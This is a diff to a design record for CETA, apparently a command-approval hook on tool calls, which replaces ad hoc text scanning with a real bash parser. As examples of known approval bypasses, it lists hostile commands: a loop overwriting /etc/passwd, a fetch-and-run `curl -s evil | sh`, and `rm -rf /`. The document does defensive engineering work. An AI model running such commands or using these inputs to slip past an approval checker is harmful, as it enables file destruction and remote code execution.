@@ -13,17 +13,22 @@ itself about where a command begins, ends, and nests.
 It does not. `cmdparse` derives command structure through **several independent, inconsistent text
 passes**, each of which decides those boundaries for itself, so a disagreement between any two of
 them is a security-relevant divergence. The design inventory records **thirteen** such sites, and
-**four** of them were or are **live auto-approve holes** — inputs on which CETA answers `Approve`
-for a command it has mis-structured. Representative examples:
+**four known** of them were or are **live auto-approve holes** — inputs on which CETA answers
+`Approve` for a command it has mis-structured. Those four are inventory sites 2, 3, 12 and 13:
 
-- `for f in a b; do echo hi; done > /etc/passwd` approved, because the loop's terminator segment is
-  dropped **with its redirection**.
-- `for x in $(curl -s evil | sh); do echo hi; done` approved, because the loop's word list is
-  dropped and the substitution is never recursed into.
-- An unbalanced quote once made a substitution enumeration return an empty list, which folded to
-  `Approve`.
-- A `docker` rule splits on `&&`/`||`/`;` **inside** `$( )`, rewrites, and **rejoins** the text
-  before handing it back to the engine, promoting `b` in `gosu u sh -c 'a; b'` to a top-level leaf.
+- **Site 12**: `for f in a b; do echo hi; done > /etc/passwd` approved, because the loop's terminator
+  segment is dropped **with its redirection**. Open, `pg2-qkecz`.
+- **Site 13**: `for x in $(curl -s evil | sh); do echo hi; done` approved, because the loop's word
+  list is dropped and the substitution is never recursed into. Open, `pg2-qkecz`.
+- **Site 2**: an unbalanced quote made a substitution enumeration return an empty list, which folded
+  to `Approve`. Fixed by `pg2-wguam`.
+- **Site 3**: the same enumeration applied quote tracking to heredoc **bodies**, where quotes are
+  data, so an apostrophe in prose swallowed a following `$( )`. Fixed by `pg2-wguam`.
+
+Site 11 — the `docker` rule splitting on `&&`/`||`/`;` **inside** `$( )`, rewriting, and **rejoining**
+the text before handing it back to the engine — is deliberately **not** counted here. Promoting `b`
+in `gosu u sh -c 'a; b'` to a top-level leaf makes it judged rather than treated as data, which is a
+corruption of structure but not in itself an approval. It is a serious defect of a different kind.
 
 The obvious remedy has already been tried. Commit `1c749bbd` consolidated four drifted scanner
 copies into one shared `shellScanner`, and **nine more instances surfaced afterwards**. A second
@@ -118,8 +123,13 @@ This ADR is self-contained on **policy**; that spec holds the working detail.
 **Replace every structure-deriving text pass in `cmdparse` with one real shell parser, reached
 through exactly one lowering seam.**
 
-1. **Parser.** CETA MUST use `mvdan.cc/sh/v3` at `Variant(LangBash)` as its only source of command
-   structure. The dependency MUST be added through the gomod2nix engine
+1. **Parser.** CETA MUST use `mvdan.cc/sh/v3` constructed as
+   `syntax.NewParser(syntax.Variant(syntax.LangBash), syntax.KeepComments(true))` as its only source
+   of command structure. **Both options are part of this decision.** The variant is what makes a
+   zsh-only construct a parse error rather than a silent mis-parse, so every dialect figure and the
+   whole of I10 depend on it; `KeepComments(true)` is what makes comment handling a parser fact,
+   which is the entire basis for retiring the per-line comment pass by construction instead of
+   replacing it. The dependency MUST be added through the gomod2nix engine
    (`go mod tidy && nix run github:nix-community/gomod2nix -- generate`, with the generated
    `gomod2nix.toml` committed); it is in neither `go.mod` nor `gomod2nix.toml` today.
 
@@ -152,7 +162,11 @@ through exactly one lowering seam.**
    were taken with an **incomplete** lowering and are a **LOWER BOUND**. The first migration step
    MUST re-measure the complete lowering, and that re-measurement is a **gate**: the conclusion "the
    candidate is not slower than what it replaces" is what this decision rests on and is not yet
-   proven for the complete lowering.
+   proven for the complete lowering. **Pass criterion**: measured over the same corpus, the complete
+   lowering MUST show **mean and p99 both no worse** than the outgoing front end's. A regression in
+   `max` alone MAY be accepted with a recorded reason, since `max` is one pathological input; a p99
+   regression MUST NOT be waived, because the hook runs on every tool call. If the gate fails, work
+   MUST stop and report.
 
 ### The seam
 
@@ -216,8 +230,10 @@ clause originates here.
   bypass. The withhold is a **rule-side** guard, so the migration step that changes how a rule
   reaches `pc.EnvVars` owes its test.
 
-- **I6 — single importer** (this decision). Only the seam file MAY import the parser's `syntax`
-  package. Every other file in the module MUST NOT import it. The constraint is stated at **file**
+- **I6 — single importer** (this decision). Only the seam file MAY import the module
+  `mvdan.cc/sh/v3` — any package within it, not merely `.../syntax`. Naming the whole module is
+  deliberate: a rule importing `mvdan.cc/sh/v3/expand` would derive structure outside the seam while
+  a `syntax`-only guard passed green. Every other file in the module MUST NOT import it. The constraint is stated at **file**
   granularity deliberately: the seam lives inside `internal/cmdparse`, which has other files, so a
   package-level rule would not bind them.
 
@@ -226,7 +242,11 @@ clause originates here.
   subtrees of an already-parsed file and MUST NOT re-parse body text. This is deliberately weaker
   than "one parse per command": the evaluator's expression entry point takes a `string`, and several
   callers construct text that exists nowhere in the source, so a **text** entry point MUST remain
-  and MUST parse.
+  and MUST parse. That entry point is **permanent, not transitional**, which needs saying because I13
+  removes the rationale just given: once no rule may construct command text, those callers cease to
+  exist. It survives because the OUTERMOST input is text — the hook receives a command string and
+  nothing upstream has parsed it. After the per-rule step its only legitimate caller is that hook
+  boundary, and it MUST NOT be deleted as dead code.
 
 - **I8 — no fallback parser** (this decision). There MUST NOT be a fallback parser. Retaining the
   previous parser for inputs the new one rejects would reintroduce two scanners that can disagree.
@@ -248,8 +268,11 @@ clause originates here.
   repository, and can drift.
 
 - **I12 — identity keys are exact source slices** (this decision). The seam MUST retain the source
-  string alongside the AST. Identity keys — cycle detection and `Raw` — MUST be exact source slices
-  and MUST NOT be produced by printing the AST.
+  string alongside the AST. Identity keys — cycle detection and `Raw` — MUST be **derived from exact
+  source slices** of the file being evaluated and MUST NOT be produced by printing the AST. "Derived
+  from" rather than "are": the cycle key passes through a whitespace-collapsing normaliser, so it is a
+  function of a slice rather than a slice itself. For the surviving text entry point of I7, whose
+  input exists in no source, the slice comes from the file produced by parsing that text.
 
 - **I13 — no rule-constructed command text** (this decision). No rule MAY construct or mutate
   command text for re-evaluation. A rule needing to delegate MUST do so through a **structural**
@@ -257,7 +280,11 @@ clause originates here.
   a fix and the `docker` text-rewriting hole survives.
 
 - **I14 — leaf coverage** (`pg2-qkecz` and this decision). Every executed subexpression MUST reach
-  **at least one** leaf. No pass MAY delete a segment. This is the coverage invariant that root
+  **at least one** leaf. Because executedness is a runtime property (`if false; then rm -rf /; fi`),
+  the binding form is a **static surrogate**: every `*syntax.CallExpr` in the parsed file, plus every
+  statement carrying redirections or a heredoc, MUST be covered by at least one leaf source span,
+  **including nodes in untaken branches**. That is the conservative direction and the correct one —
+  CETA cannot know which branch runs, so it MUST judge every branch that could. No pass MAY delete a segment. This is the coverage invariant that root
   cause 4 requires and that a differential replay structurally cannot provide.
 
   The requirement is **coverage, not partition**, and that is a decision rather than an imprecision.
@@ -271,7 +298,13 @@ clause originates here.
 
 ### Enforcement
 
-Policy without a mechanism is folklore, so each of the load-bearing invariants MUST get one:
+Policy without a mechanism is folklore. The guards below give one to I6, I7, I9 and I14. The
+remaining invariants are enforced by test rather than by guard, and the mapping MUST be honoured:
+I1a, I1b, I2, I3, I4 and I5 by the named regression tests of the beads that established them; I8 by
+the flip step removing the shadow comparison outright; I12 and I13 by the type change guard 2
+introduces. **I11 is not mechanically testable** — it is a constraint on how the migration is
+scheduled (no blocking edge on the agent-shell change), not a property of the binary, and it MUST be
+upheld by review.
 
 1. **Import guard** (I6). A test MUST walk the import graph and fail if any file other than the seam
    imports the parser's `syntax` package. It MUST be demonstrated by temporarily adding the import
@@ -293,10 +326,16 @@ Policy without a mechanism is folklore, so each of the load-bearing invariants M
    fixed.
 
 4. **Coverage check** (I14). For every corpus row, a check MUST assert that the union of leaf source
-   spans covers every executed subexpression of the parsed file. This does not depend on
+   spans covers the static surrogate named in I14 — every `*syntax.CallExpr`, plus every statement
+   carrying redirections or a heredoc, including untaken branches. This needs **no working
+   directory**, so it MUST run on all 189,678 rows. It does not depend on
    differential comparison and is the only mechanism that can see root cause 4.
 
-5. **Differential replay.** Every migration step MUST replay all 189,678 rows and publish a
+5. **Differential replay.** The obligation splits by what each check needs, because about 34% of
+   rows have a non-existent working directory and no verdict can be produced for them: the parse,
+   lowering and coverage checks MUST run on **all 189,678 rows**, while the **verdict** replay MUST
+   run on the **working-directory-resolvable subset** with skips reported as a count and never
+   presented as the whole. Every migration step MUST publish a
    transition table. The gate is **no transition in the less-restrictive direction** under
    `Approve < Abstain < Ask < Reject`. It MUST be worded that way rather than as "toward approve", so
    that I1b's `Reject → Abstain` forfeiture is caught rather than passing silently. The one permitted
@@ -488,7 +527,7 @@ future reader will be held to.
 - **Which four of the thirteen inventory sites are the live auto-approve holes** is now enumerated as
   sites 2, 3, 12 and 13 (sites 2 and 3 fixed by `pg2-wguam`; sites 12 and 13 open under `pg2-qkecz`).
   What remains open is whether that list is complete: sites 2 and 3 were found by inspection, 12 and
-  13 by review of this decision's own first draft, and the search that found them was not systematic.
+  13 by the adversarial review of the design spec, and the search that found them was not systematic.
   A count of "four" MUST therefore be read as "four known", not "four".
 
 **Decided in place, rather than carried forward:**
